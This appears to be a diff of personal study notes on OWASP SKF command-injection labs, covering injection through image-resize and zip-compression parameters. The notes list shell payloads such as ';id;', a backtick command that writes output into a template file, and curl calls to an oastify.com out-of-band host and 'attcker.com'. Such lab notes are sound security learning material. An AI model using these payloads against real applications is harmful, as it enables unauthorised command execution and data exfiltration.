@@ -28,4 +28,27 @@ size=50
 - The input we give to the application here is  `size`
 - We assume that the application uses the `convert` command.
 - `convert path -resize `
-- we use 
+- payload's
+```shell
+echo `id` >> templates/index.html
+curl http://9v5hvo5p57s8akbk74qdfpmbk2qtej28.oastify.com;
+```
+- ![[skf-lab1-4.png]]
+
+
+
+## Laboratory 2
+- we in lab compressing a file
+- ![[skf-lab2-1.png]]
+- We imagine a zip command being called in the background.
+- testing payload's
+```shell
+;echo 1;
+;whomai;
+;id;
+;curl%20attcker.com;
+
+```
+- ![[skf-lab2-3.png]]
+## [lab3](https://skf.gitbook.io/asvs-write-ups/command-injection-4-cmd-4/cmd4) Read writeup 
+## [lab5 blind](https://skf.gitbook.io/asvs-write-ups/command-injection-blind-cmd-blind/blind-cmd-injection-1) read writeup 
